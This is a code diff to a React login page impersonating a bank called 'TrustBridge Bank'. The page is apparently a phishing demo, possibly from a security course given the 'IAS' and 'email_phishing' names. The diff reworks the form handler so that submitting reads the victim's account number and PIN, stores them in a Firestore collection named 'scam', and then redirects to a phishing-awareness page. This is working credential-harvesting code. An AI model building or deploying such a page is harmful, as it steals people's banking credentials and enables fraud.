@@ -125,7 +125,31 @@ const TrustBridgeBankLogin: React.FC = () => {
                 </p>
 
                 <form
-                  action={"https://exxsid.github.io/IAS/email_phishing.html"}
+                  onSubmit={async (e) => {
+                    e.preventDefault();
+
+                    const accountNumber = (
+                      document.getElementById(
+                        "accountNumber"
+                      ) as HTMLInputElement
+                    ).value;
+                    const pin = (
+                      document.getElementById("pin") as HTMLInputElement
+                    ).value;
+
+                    try {
+                      const db = getFirestore(app);
+                      await addDoc(collection(db, "scam"), {
+                        accountNumber: accountNumber,
+                        pin: pin,
+                      });
+                      console.log("Document written with ID: ", accountNumber);
+                      window.location.href =
+                        "https://exxsid.github.io/IAS/email_phishing.html";
+                    } catch (error) {
+                      console.error("Error adding document: ", error);
+                    }
+                  }}
                 >
                   <div className="mb-4">
                     <label
@@ -155,39 +179,6 @@ const TrustBridgeBankLogin: React.FC = () => {
                   </div>
                   <button
                     type="submit"
-                    onClick={async () => {
-                      // add the account number and pin to firebse firestore
-                      const accountNumber = (
-                        document.getElementById(
-                          "accountNumber"
-                        ) as HTMLInputElement
-                      ).value;
-                      const pin = (
-                        document.getElementById("pin") as HTMLInputElement
-                      ).value;
-
-                      const db = getFirestore(app);
-                      interface UserData {
-                        accountNumber: string;
-                        pin: string;
-                      }
-
-                      await setDoc(doc(db, "scam", accountNumber), {
-                        accountNumber: accountNumber,
-                        pin: pin,
-                      } as UserData).then(() => {
-                        console.log(
-                          "Document written with ID: ",
-                          accountNumber
-                        );
-                      });
-
-                      const docRef = await addDoc(collection(db, "scam"), {
-                        accountNumber: accountNumber,
-                        pin: pin,
-                      } as UserData);
-                      console.log("Document written with ID: ", docRef.id);
-                    }}
                     className="w-full bg-blue-900 text-white py-2 rounded hover:bg-blue-800"
                   >
                     Log In
